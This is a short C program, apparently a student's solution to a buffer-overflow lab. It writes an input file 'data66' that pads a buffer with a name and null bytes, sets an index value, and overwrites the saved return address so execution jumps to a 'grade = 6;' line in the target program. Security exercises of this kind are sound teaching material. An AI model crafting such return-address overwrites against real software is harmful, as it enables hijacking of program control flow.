#include <stdio.h>


/* @author Sundorius */



int main(void)
{
	int i =0;
	FILE *file = fopen("data66", "w");
	fputs("Manos Katsifarakis",file); /* Write in buff
										from position 0 - 18. */
	for(i=0; i<25; i++)  /* Fill the rest of the positions of buf with \0, until position 43. */
	{
		putc('\0', file);
	}
	putc(55, file);  /* Put the number 55 to i, so by doing i++ we accomplish to go to the address of the return address. */
	putc(0x80,file); /* LS bit. Writes in the return address, the address of the line "grade = 6;". */
	putc(0x48,file);
	putc(0xb6,file);
	putc(0x08,file); /* MS bit*/
	fclose(file);	
	return 0;
}